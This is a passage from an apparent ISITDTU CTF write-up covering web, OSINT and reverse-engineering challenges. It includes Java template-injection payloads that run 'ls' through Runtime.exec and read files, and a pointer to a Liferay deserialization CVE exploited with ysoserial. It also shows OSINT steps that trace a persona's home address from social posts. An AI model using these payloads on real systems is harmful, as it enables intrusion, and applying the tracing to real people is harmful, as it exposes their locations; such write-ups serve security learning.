</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Deserialized User Name: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">deserializedUser</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Again, the Flag file is named random -&gt; need to run <code>ls</code> command to know the file name. Use this payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user.setName(&#34;new String($date.getClass().forName(\&#34;java.lang.Runtime\&#34;).getRuntime().exec(\&#34;ls\&#34;).getInputStream().readAllBytes())&#34;);
</span></span></code></pre></div><p><img src="https://hackmd.io/_uploads/B1YJIjseJl.png" alt="image"></p>
<p>Convert array to readable ASCII characters:</p>
<p><img src="https://hackmd.io/_uploads/rkA8IojxJx.png" alt="image"></p>
<p>So the name of the flag file is <code>m62dyeu1gr3t</code>. Now read flag with payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user.setName(&#34;$date.getClass().forName(&#39;java.nio.file.Files&#39;).readAllLines($date.getClass().forName(&#39;java.nio.file.Paths&#39;).get(&#39;m62dyeu1gr3t&#39;))&#34;);
</span></span></code></pre></div><p><img src="https://hackmd.io/_uploads/HJCsLise1e.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{We1come_t0_1s1tDTU_CTF}
</span></span></code></pre></div><h3 id="niceray">
<a class="header-anchor" href="#niceray"></a>
niceray
</h3><p><img src="https://hackmd.io/_uploads/BJ7mCqig1l.png" alt="image"></p>
<p>This is a Liferay challenge, quick look at the source code reveals the version of this application:
<img src="https://hackmd.io/_uploads/By0mQp1Zkl.png" alt="image"></p>
<p>This Liferay version has a deserialization CVE:
<img src="https://hackmd.io/_uploads/rJrcQ6kbkl.png" alt="image"></p>
<p>PoC: <a href="https://gist.github.com/testanull/4bb77519acf2c8e919f8d9b015eda880">https://gist.github.com/testanull/4bb77519acf2c8e919f8d9b015eda880</a></p>
<p>However, author might have considered this CVE an unintended solution, therefore, this can not be exploited remotely:
<img src="https://hackmd.io/_uploads/HyxJEaJ-yg.png" alt="image"></p>
<p>However, if I don&rsquo;t exploit JSONWS, I can still refer to another blog (which have PoC): <a href="https://sec.vnpt.vn/2019/02/liferay-bypass-story-part-2/">https://sec.vnpt.vn/2019/02/liferay-bypass-story-part-2/</a></p>
<p>Using the endpoint <code>#/../api/liferay</code>, I can still exploit by sending payload as raw payload (bytes) from ysoserial:
<img src="https://hackmd.io/_uploads/rkJv4pJb1e.png" alt="image"></p>
<h2 id="osint">
<a class="header-anchor" href="#osint"></a>
Osint
</h2><h3 id="sparks">
<a class="header-anchor" href="#sparks"></a>
Sparks
</h3><p><img src="https://hackmd.io/_uploads/SJ1Y65jlJl.png" alt="image"></p>
<p>In this challenge, we need to identify the location where the video of burning buildings was filmed using a TikTok link …with precise coordinates.</p>
<p><a href="https://www.tiktok.com/@juleko_o/video/7206026807483796741">https://www.tiktok.com/@juleko_o/video/7206026807483796741</a></p>
<p>In the video description of &ldquo;Cháy toà nhà chọc trời ở Trung Quốc&rdquo; along with the tag #china, it can be inferred that this location is somewhere in China.</p>
<p><img src="https://hackmd.io/_uploads/HkGltijl1e.png" alt="image"></p>
<p>Since this is HOT information, we can search for details based on news articles on Google.</p>
<p><img src="https://hackmd.io/_uploads/r1FS2ije1g.png" alt="image"></p>
<p>Fortunately, the publication date is March 3, 2023 (matching the video upload date), which allows me to confidently confirm that the article refers to this particular building.</p>
<blockquote>
<p>TPO - A large fire broke out at 11:11 p.m. on March 2 at a high-rise building under construction in the busy commercial district of <code>Tsim Sha Tsui</code> (Hong Kong, China).
According to local authorities, as of the morning of March 3, no casualties were recorded. Police said about 130 people living in the nearby <code>Star Mansion</code>, <code>Far East Mansion</code> and <code>Chungking Mansions</code> have been evacuated.,</p></blockquote>
<p>We can search for<code>Tsim Sha Tsui</code>, <code>Star Mansion</code>, <code>Far East Mansion</code>, and <code>Chungking Mansions</code> on Google Maps to narrow down the area. Additionally, by looking at other news articles, it appears the building is located on <code>Middle Road</code>.</p>
<p><img src="https://hackmd.io/_uploads/SyH1ynie1e.jpg" alt="image-min"></p>
<p>At the angle of the video, I think the cameraman will be standing on top of a certain building behind the burning building.</p>
<p><img src="https://hackmd.io/_uploads/H1APJ2sl1e.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{22.2966, 114.1735}
</span></span></code></pre></div><h3 id="home-sweet-home">
<a class="header-anchor" href="#home-sweet-home"></a>
Home sweet home
</h3><p><img src="https://hackmd.io/_uploads/rkpoJ2ig1g.png" alt="image"></p>
<blockquote>
<p>We have just received information from our spy that Arlen is also using an alias &ldquo;arlen.nnnnnnnn&rdquo;. From this information, can you track down his home address?</p></blockquote>
<p>So we need to search for information on arlen.nnnnnnnn on social media because, in the challenge <code>Two Steps Ahead</code>, it was mentioned that Arlen is addicted to social media. After searching, we found this guy&rsquo;s Instagram account.</p>
<p><img src="https://hackmd.io/_uploads/SkEAA2sl1g.png" alt="image"></p>
<p>We have a total of four posts. What information can we gather from these four hints?</p>
<p><img src="https://hackmd.io/_uploads/BkMmypsekl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Bkgvkpigke.png" alt="image"></p>
<p>In this post, I found a house. After using Google Images to identify it, I confirmed it as Centre culturel Calixa-Lavallée in Quebec, Canada, with the Google Maps link <a href="https://maps.app.goo.gl/gC6u3kK37sxLoksv9">here</a>. So, his house is about a 20-minute bike ride from this location.</p>
<p><img src="https://hackmd.io/_uploads/Bk5wepjlJe.png" alt="image"></p>
<p>In this post, we can infer that his house is located near a school.</p>
<p><img src="https://hackmd.io/_uploads/BJky-pixkl.png" alt="image"></p>
<p>In this post, he mentions that a pet shop is very close to his house, so we decided to use Google Images to identify the species of frog featured in the post and determine which shop sells it in Canada.</p>
<p><img src="https://hackmd.io/_uploads/rJPV-pse1g.png" alt="image"></p>
<p>So, I used ChatGPT to search for stores in Quebec, Canada, that sell this type of frog, and Magazoo is the pet store that meets this criterion.</p>
<p><img src="https://hackmd.io/_uploads/rkSHGail1e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Sy60zpig1l.png" alt="image"></p>
<p><a href="https://maps.app.goo.gl/8KsQaAvVqs1BAg1z6">https://maps.app.goo.gl/8KsQaAvVqs1BAg1z6</a>. Checking Time?!</p>
<p><img src="https://hackmd.io/_uploads/B1KbNpigkx.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{45.547, -73.602}
</span></span></code></pre></div><h2 id="reverse-engineering">
<a class="header-anchor" href="#reverse-engineering"></a>
Reverse Engineering
</h2><h3 id="re01">
<a class="header-anchor" href="#re01"></a>
re01
</h3><p><img src="https://hackmd.io/_uploads/rJcT1noeyl.png" alt="image"></p>
<p>This challenge basically hides íts actual flow in <code>TLS Callbacks</code> functions (call before <code>main</code>):
<img src="https://hackmd.io/_uploads/BJRbe3ixJe.png" alt="image"></p>
<p>I just have to patch the <code>IsDebuggerPresent()</code> and debug. Here is the solve script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x7C</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x7C</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x4E</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x5A</span><span class="p">,</span><span class="mh">0x5B</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x6C</span><span class="p">,</span><span class="mh">0x5A</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x5A</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x79</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x7D</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x5B</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mh">0x0F</span><span class="p">,</span><span class="mh">0x1C</span><span class="p">,</span><span class="mh">0x48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="mh">0x35</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">))</span>
</span></span></code></pre></div><p><code>ISITDTU{Congrats_You_Solved_TLS_Callback_Re01_Have_Fun_:)}</code></p>
<h3 id="animal">
<a class="header-anchor" href="#animal"></a>
animal
</h3><p><img src="https://hackmd.io/_uploads/HJgOeghogJl.png" alt="image"></p>
<p>This challenge will load the <code>check_flag</code> from stack after some calculation so <code>IDA</code> cannot analyze and decompile it. So I have to debug to this function and analyze statically. To get into this funtion, our input must be 36 characters with some conditions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">input[8] = &#39;a&#39;
</span></span><span class="line"><span class="cl">input[17] = &#39;c&#39;
</span></span><span class="line"><span class="cl">input[18] = &#39;a&#39;
</span></span><span class="line"><span class="cl">input[19] = &#39;t&#39;
</span></span><span class="line"><span class="cl">input[33] = input[34]
</span></span></code></pre></div><p>Here is a piece of the <code>check_flag</code> function after I debug into it:</p>
<p><img src="https://hackmd.io/_uploads/BkeiMnieJe.png" alt="image"></p>
<p>Those instructions before <code>jnz</code> looks like equations so I write down into my note:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a[25] * a[27] * a[32] + a[1] * a[8] - a[29] == 0x83872
</span></span><span class="line"><span class="cl">a[4] * a[10] * a[20] - a[6] - a[11] + a[7] == 0xA271A
</span></span><span class="line"><span class="cl">a[31] * (a[16] - 1) - a[22] * a[30]  + a[14] == -2945
</span></span><span class="line"><span class="cl">a[3] - a[9] - a[18] - a[11] - a[4] + a[33] == -191
</span></span><span class="line"><span class="cl">a[29] * a[25] - a[8] + a[18] + a[30] + a[1] == 0x12F5
</span></span><span class="line"><span class="cl">a[5] - a[2] * a[23] * a[14] * a[7] + a[13] == -86153321
</span></span><span class="line"><span class="cl">a[10] * a[27] + a[12] * a[5] * a[9] + a[13] == 0xD54D2
</span></span><span class="line"><span class="cl">a[21] * a[9] * a[18] - a[6] + a[3] + a[22] == 0x6E43C
</span></span><span class="line"><span class="cl">a[23] * a[32] - a[4] + a[24] + a[34] + a[21] == 0x2486
</span></span><span class="line"><span class="cl">a[17] - a[19] - a[26] - a[6] + a[35] + a[24] == 0x1B
</span></span><span class="line"><span class="cl">a[19] * a[23] - a[3] + a[15] + a[13] + a[14] == 0x2BEF
</span></span><span class="line"><span class="cl">a[12] * a[7] - a[15] - a[21] + a[17] + a[2] == 0x33F1
</span></span><span class="line"><span class="cl">a[28] - a[0] - a[20] + a[35] + a[26] + a[8] == 0x10A
</span></span><span class="line"><span class="cl">a[28] * a[12] - a[1] + a[0] + a[17] + a[2] == 0x28B6
</span></span><span class="line"><span class="cl">a[19] * a[5] - a[34] - a[11] + a[15] + a[22] == 0x269B
</span></span><span class="line"><span class="cl">(1 - a[20]) * a[16] + a[33] * a[10] - a[0] == -5604
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">a[33] == a[34]
</span></span><span class="line"><span class="cl">2 * a[8] == 0xC2
</span></span><span class="line"><span class="cl">a[0] == &#39;I&#39;
</span></span><span class="line"><span class="cl">a[1] == &#39;S&#39;
</span></span><span class="line"><span class="cl">a[2] == &#39;I&#39;
</span></span><span class="line"><span class="cl">a[3] == &#39;T&#39;
</span></span><span class="line"><span class="cl">a[4] == &#39;D&#39;
</span></span><span class="line"><span class="cl">a[5] == &#39;T&#39;
</span></span><span class="line"><span class="cl">a[6] == &#39;U&#39;
</span></span><span class="line"><span class="cl">a[7] == &#39;{&#39;
</span></span><span class="line"><span class="cl">a[17] == &#39;c&#39;
</span></span><span class="line"><span class="cl">a[18] == &#39;a&#39;
</span></span><span class="line"><span class="cl">a[19] == &#39;t&#39;
</span></span><span class="line"><span class="cl">a[35] == &#39;}&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">r9 = a[0]
</span></span><span class="line"><span class="cl">r10 = a[33] * a[10]
</span></span><span class="line"><span class="cl">r11 = a[15]
</span></span><span class="line"><span class="cl">r12 = a[10]
</span></span><span class="line"><span class="cl">r13 = a[22]
</span></span><span class="line"><span class="cl">r14 = a[12]
</span></span><span class="line"><span class="cl">r15 = a[20]
</span></span><span class="line"><span class="cl">ebp = a[8]
</span></span><span class="line"><span class="cl">esi = a[1]
</span></span><span class="line"><span class="cl">edi = a[2]
</span></span><span class="line"><span class="cl">eax = a[16]
</span></span><span class="line"><span class="cl">ebx = a[17]
</span></span><span class="line"><span class="cl">ecx = (1 - a[20]) * a[16] + a[33] * a[10] - a[0] == 0xFFFFEA1C
</span></span><span class="line"><span class="cl">edx = a[28] * a[12] - a[1] + a[0] + a[17] + a[2] == 0x28B6
</span></span><span class="line"><span class="cl">[rsp+40h] = edx = a[35]
</span></span><span class="line"><span class="cl">[rsp+38h] = r14 = a[26]
</span></span></code></pre></div><p>The last step is to use <code>z3-solver</code> to find the flag. Script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="n">Int</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;a[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x83872</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xA271A</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">2945</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">191</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x12F5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">86153321</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xD54D2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x6E43C</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">34</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x2486</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">35</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x1B</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x2BEF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x33F1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">35</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x10A</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x28B6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">34</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x269B</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="mi">1</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">20</span><span class="p">])</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="n">a</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">5604</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="mi">34</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xC2</span><span class="p">)</span>
